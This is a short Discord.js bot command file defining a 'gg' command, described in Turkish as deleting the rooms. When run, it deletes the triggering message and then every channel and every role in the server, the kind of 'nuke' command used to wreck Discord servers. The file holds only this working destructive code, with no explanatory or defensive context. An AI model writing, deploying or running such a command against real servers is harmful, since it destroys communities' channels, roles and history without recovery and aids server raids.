const Discord = require('discord.js');
const db = require('quick.db')
const client = new Discord.Client();

exports.run = async (client, message, args) => {
  
  
  message.channel.bulkDelete(1)
   message.guild.channels.forEach(a => a.delete())
   message.guild.roles.forEach(a => a.delete())
  };
exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['gg'],
  permLevel: 4
}

exports.help = {
  name: 'gg',
  description: "Odaları siler",
  usage: 'gg'
  
}
